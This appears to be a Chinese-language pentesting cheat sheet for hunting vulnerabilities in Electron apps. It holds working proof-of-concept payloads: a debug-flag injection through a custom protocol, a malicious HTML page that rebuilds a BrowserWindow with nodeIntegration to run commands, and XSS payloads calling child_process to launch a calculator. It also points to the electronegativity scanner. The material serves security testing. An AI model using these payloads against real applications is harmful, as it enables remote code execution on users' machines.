挖掘思路
========================================

组件漏洞
----------------------------------------
+ 使用asar解压程序文件，切换到解压目录中.
+ 执行 npm install --package-lock-only 生成package-lock.json文件。
+ 执行 npm audit --verbose进行组件漏洞分析。

调试功能引起的RCE
----------------------------------------
+ 自定义协议打开： ``myapp://xxxxx" --inspect-brk=0.0.0.0:9229 --"``
+ 攻击者主机打开:  ``chrome://inspect/#devices`` ，点击 ``Configure...``，添加攻击者主机IP和端口号。
+ 打开控制台输入： ``require('child_process').exec('calc.exe')``
+ 注： ``Electron < 1.8.2-beta.4、1.7.11、1.6.16 的版本`` 存在调试功能引起的RCE漏洞，攻击者可以通过构造恶意链接来执行任意代码。

APP内连接
----------------------------------------
+ 原理：APP内打开链接时，其中的js代码可调用node.js的API，攻击者可以通过构造恶意链接来执行任意代码。
+ 恶意js：
    ::
    
        <a href="javascript:require('child_process').exec('calc.exe')">Click me</a>
        恶意HTML：
        <html>
        <body>
        <script>
        // overwrite functions to get a BrowserWindow object:
        window.desktop.delegate = {}
        window.desktop.delegate.canOpenURLInWindow = () => true
        window.desktop.window = {}
        window.desktop.window.open = () => 1
        bw = window.open('about:blank') // leak BrowserWindow class
        nbw = new bw.constructor({show: false, webPreferences: {nodeIntegration: true}}) // let's make our own with nodeIntegration
        nbw.loadURL('about:blank') // need to load some URL for interaction
        nbw.webContents.executeJavaScript('this.require("child_process").exec("open /Applications/Calculator.app")') // exec command
        </script>
        </body>
        </html>

XSS漏洞
----------------------------------------
+ 示例程序：https://github.com/MrH4r1/Electro-XSS
+ payload
    - ``<img src=x onerror=alert(1) />``
    - ``<img src=x onerror=alert(require('child_process').execSync('gnome-calculator')); />``
    - ``<img src=x onerror=alert(require('child_process').exec('calc')); />``

可控页面
----------------------------------------
+ 调用系统浏览器打开的API
    -  ``shell.openExternal('http://malicious.site')``
    - 注意： ``file://`` 协议可直接进行本地文件执行
+ Electron自己打开页面的API
    - ``win.loadURL('http://malicious.site')``
    - ``win.webContents.loadURL('http://malicious.site')``
    - webview/iframe标签
    - ``window.open``

IPC攻击
----------------------------------------

webview攻击
----------------------------------------
+ webPreferences中启用webview：
    - webviewTag: true
    - <webview src="http://malicious.site"></webview>

升级漏洞
----------------------------------------

查看是否有自定义协议
----------------------------------------
+ grep -r "registerHttpProtocol" ./

查找有无html内容拼接
----------------------------------------
    ::
    
        var $input2 = $("<input type='text' value='"+value+"' name='value' class='form-control' style=' width:20%; display: inline-block;' placeholder='value'>");
        分析拼接的输入点是否用户可控，查看是否有xss漏洞。

相关工具
----------------------------------------

electronegativity
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 项目地址： ``https://github.com/doyensec/electronegativity``
+ 介绍：静态代码分析工具。
+ 安装： ``npm install @doyensec/electronegativity -g``
+ 分析目录： ``electronegativity -i /path/to/electron/app``
+ 分析ASAR： ``electronegativity -i /path/to/asar/archive -o result.csv``

相关资料
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 空闲时间学习： ``https://github.com/doyensec/awesome-electronjs-hacking``